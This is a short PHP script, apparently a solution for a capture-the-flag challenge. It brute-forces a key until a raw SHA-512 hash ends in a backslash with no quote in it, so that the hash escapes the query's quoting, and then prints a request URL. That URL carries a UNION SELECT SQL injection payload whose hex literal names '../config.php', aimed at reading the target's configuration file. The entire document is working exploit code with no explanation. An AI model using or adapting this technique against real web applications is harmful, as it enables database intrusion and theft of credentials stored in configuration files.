<?php

function freelancer_hash()
{
	$result = implode( func_get_args() );

	for( $i = 0; $i < 10000; $i++ )
	{
		$result = hash( 'sha512', $result, true );
	}

	return $result;
}

$id = ' UNION SELECT * FROM(SELECT * FROM(SELECT 1)a JOIN(SELECT 0x2e2e2f636f6e6669672e706870)b)c#';

if( isset( $_GET['id'] ) )
{
	$id = $_GET['id'];
}

for( $key = 0; true; $key++ )
{
	$hash = freelancer_hash( $key, $id );

	if( ( strpos( $hash, '\'' ) === false ) && ( substr( $hash, -1 ) === '\\' ) )
	{
		exit( '?m=cargo&id=' . urlencode( $id ) . '&key=' . urlencode( $key ) );
	}
}

?>
